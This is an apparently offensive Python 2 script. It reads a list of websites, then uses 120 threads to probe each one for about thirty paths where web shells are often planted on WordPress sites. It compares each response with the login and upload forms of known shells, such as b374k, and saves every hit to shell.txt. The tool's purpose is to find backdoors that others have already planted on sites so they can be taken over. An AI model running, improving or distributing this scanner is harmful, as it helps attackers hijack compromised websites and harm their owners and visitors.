import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
  ______ _                _____ _    _ _  _______  _____ _____ 
 |  ____| |        /\    / ____| |  | | |/ /_   _|/ ____/ ____|
 | |__  | |       /  \  | (___ | |__| | ' /  | | | (___| (___  
 |  __| | |      / /\ \  \___ \|  __  |  <   | |  \___ \\___ \ 
 | |    | |____ / ____ \ ____) | |  | | . \ _| |_ ____) |___) |
 |_|    |______/_/    \_\_____/|_|  |_|_|\_\_____|_____/_____/ 
                                                               
                                                               
\n'''.format(fr)
print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/.well-known/pki-validation/cux.php',
			'/cux.php',
			'/wp-admin/cux.php',
			'/luxx.php',
			'/lufix.php',
			'/luf.php',
			'/wp-content/uploads/wpr-addons/forms/b1ack.php',
			 '/wp-content/plugins/fix/up.php',
			 '/wp-content/themes/twentyfive/include.php',
			 '/wp-content/plugins/wordpresss3cll/includes.php',
			 '/defaults.php',
			 '/simple.php',
			 '/about.php',
			 '/install.php',
			 '/dropdown.php',
			 '/chosen.php?p=',
			 '/mah.php',
			 '/wp-content/plugins/wordpresss3cll/wp-login.php',
			 '/wp-admin/about.php',
			 '/wp-content/about.php',
			 '/wp-admin/install.php',
			 '/wp-admin/js/about.php7',
			 '/wp-content/install.php',
			 '/wp-admin/user/about.php',
			 '/wp-includes/install.php',
			 '/wp-admin/images/admin.php',
			 '/wp-includes/Text/about.php',
			 '/wp-admin/network/admin.php',
			 '/wp-admin/maint/atomlib.php',
			 '/wp-admin/network/index.php',
			 '/wp-content/plugins/index.php',
			 '/wp-content/uploads/index.php',
			 '/wp-content/themes/twentytwentythree/patterns/index.php'
			 ]

class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("<pre align=center><form method=post>Password<br><input type=password name=pass" in check or  '<input type="file" name="fileToUpload" id="fileToUpload">' in check or 'input type="password" name="pwdyt" value="" placeholder="passwd"' in check or 'C0mmand' in check or 'meta name="robots" content="noindex"><form method="post" enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<' in check or "b374k 2.8" in check or '-rw-r--r--' in check or '<img src="https://github.com/fluidicon.png" width="30" height="30" alt="">' in check or 'Uname:' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def FLashKIss(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(120)
mp.map(FLashKIss, target)
mp.close()
mp.join()